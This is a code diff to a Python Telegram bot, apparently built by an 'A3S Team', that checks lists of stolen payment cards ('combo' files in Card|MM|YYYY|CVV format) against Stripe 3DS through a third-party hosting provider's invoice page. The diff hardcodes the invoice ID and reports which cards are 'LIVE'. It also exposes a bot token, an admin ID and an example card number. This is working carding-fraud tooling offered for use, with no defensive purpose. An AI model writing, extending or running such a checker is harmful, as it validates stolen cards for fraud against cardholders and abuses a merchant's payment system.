@@ -16,6 +16,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # بيانات البوت
 TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
 ADMIN_ID = 5895491379
+INVOICE_ID = 260528
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 
@@ -43,15 +44,14 @@ def is_valid_bin(card_number):
 
 # كلاس لفحص الكروت باستخدام Stripe
 class StripeChecker:
-    def __init__(self, invoice_id):
-        self.invoice_id = invoice_id
+    def __init__(self):
         self.session_id = None
         self.total_amount = None
         self.stripe_mid = None
         self.stripe_sid = None
 
     def fetch_invoice_data(self) -> tuple:
-        url = f"https://vsys.host/viewinvoice.php?id={self.invoice_id}"
+        url = f"https://vsys.host/viewinvoice.php?id={INVOICE_ID}"
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
@@ -331,7 +331,7 @@ def start_message(message):
 🔒 Secure Processing
 💳 Only LIVE Cards Sent
 
-📤 Send invoice ID and combo file or card details to start checking!
+📤 Send combo file or card details to start checking!
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -346,12 +346,9 @@ def handle_document(message):
         lines = downloaded_file.decode("utf-8").splitlines()
         
         cards = []
-        invoice_id = None
         for line in lines:
             line = line.strip()
-            if line.isdigit() and len(line) >= 6:  # Assuming invoice ID is a number with at least 6 digits
-                invoice_id = line
-            elif '|' in line and len(line.split('|')) == 4:
+            if '|' in line and len(line.split('|')) == 4:
                 parts = line.split('|')
                 cards.append({
                     'number': parts[0].strip(),
@@ -361,14 +358,11 @@ def handle_document(message):
                     'raw': line
                 })
         
-        if not invoice_id:
-            bot.reply_to(message, "❌ No invoice ID found in file!")
-            return
         if not cards:
             bot.reply_to(message, "❌ No valid cards found in file!")
             return
         
-        user_cards[user_id] = {'invoice_id': invoice_id, 'cards': cards}
+        user_cards[user_id] = {'cards': cards}
         checking_status[user_id] = False
         
         cc_count = len(cards)
@@ -380,7 +374,6 @@ def handle_document(message):
             text=f"""<b>✅ File Uploaded Successfully!
 ━━━━━━━━━━━━━━━━━━━━
 💳 Total Cards: {cc_count}
-📄 Invoice ID: {invoice_id}
 🔥 Gateway: Stripe 3DS
 ⚡ Status: Ready
 
@@ -394,25 +387,15 @@ Click below to start checking:
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     text = message.text.strip()
-    parts = text.split('\n')
-    invoice_id = None
-    card = None
-    
-    if len(parts) >= 2:
-        if parts[0].isdigit() and len(parts[0]) >= 6:
-            invoice_id = parts[0]
-            if '|' in parts[1] and len(parts[1].split('|')) == 4:
-                card_parts = parts[1].split('|')
-                card = {
-                    'number': card_parts[0].strip(),
-                    'month': card_parts[1].strip().zfill(2),
-                    'year': card_parts[2].strip(),
-                    'cvv': card_parts[3].strip(),
-                    'raw': parts[1]
-                }
-    
-    if invoice_id and card:
-        user_cards[message.from_user.id] = {'invoice_id': invoice_id, 'cards': [card]}
+    if '|' in text and len(text.split('|')) == 4:
+        parts = text.split('|')
+        user_cards[message.from_user.id] = {'cards': [{
+            'number': parts[0].strip(),
+            'month': parts[1].strip().zfill(2),
+            'year': parts[2].strip(),
+            'cvv': parts[3].strip(),
+            'raw': text
+        }]}
         checking_status[message.from_user.id] = False
         
         keyboard = types.InlineKeyboardMarkup(row_width=2)
@@ -422,8 +405,7 @@ def handle_text(message):
             chat_id=message.chat.id,
             text=f"""<b>✅ Card Loaded!
 ━━━━━━━━━━━━━━━━━━━━
-💳 Card: <code>{card_parts[0][:6]}...{card_parts[0][-4:]}</code>
-📄 Invoice ID: {invoice_id}
+💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
 🔥 Gateway: Stripe 3DS
 ⚡ Status: Ready
 </b>""",
@@ -431,12 +413,8 @@ def handle_text(message):
         )
     else:
         bot.reply_to(message, """<b>❌ Invalid format!
-Use: 
-InvoiceID
-Card|MM|YYYY|CVV
-Example:
-260528
-5127740082586858|11|2028|155
+Use: Card|MM|YYYY|CVV
+Example: 5127740082586858|11|2028|155
 </b>""")
 
 @bot.callback_query_handler(func=lambda call: call.data == 'start_check')
@@ -444,7 +422,7 @@ def start_checking(call):
     user_id = call.from_user.id
     
     if user_id not in user_cards or not user_cards[user_id]['cards']:
-        bot.answer_callback_query(call.id, "❌ No cards or invoice ID loaded!")
+        bot.answer_callback_query(call.id, "❌ No cards loaded!")
         return
     
     if checking_status.get(user_id, False):
@@ -460,7 +438,6 @@ def start_checking(call):
 def check_cards_thread(user_id, message):
     data = user_cards[user_id]
     cards = data['cards']
-    invoice_id = data['invoice_id']
     total = len(cards)
     
     bot.edit_message_text(
@@ -469,7 +446,7 @@ def check_cards_thread(user_id, message):
         text="⏳ Initializing checker...\n🔑 Getting invoice data..."
     )
     
-    checker = StripeChecker(invoice_id)
+    checker = StripeChecker()
     live = otp = declined = errors = checked = key_attempts = na_count = 0
     wait_time = 60  # بداية الانتظار بدقيقة
     start_time = time.time()
@@ -572,7 +549,6 @@ def check_cards_thread(user_id, message):
 {progress_bar}
 ⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
 💳 Current: {card['number'][:6]}...{card['number'][-4:]}
-📄 Invoice ID: {invoice_id}
 🔑 Key Attempts: {key_attempts}
 ❔ N/A Count: {na_count}
 ⏱ Wait Time: {wait_time}s
@@ -666,16 +642,14 @@ def help_message(message):
 /status - Check bot status
 
 📤 How to use:
-1. Send invoice ID and combo file or card details
+1. Send combo file or card details
 2. Click "Start Checking"
 3. Only LIVE cards sent, others via button
 
 📝 Combo Format:
-InvoiceID
 Card|MM|YYYY|CVV
 
 Example:
-260528
 5127740082586858|11|2028|155
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
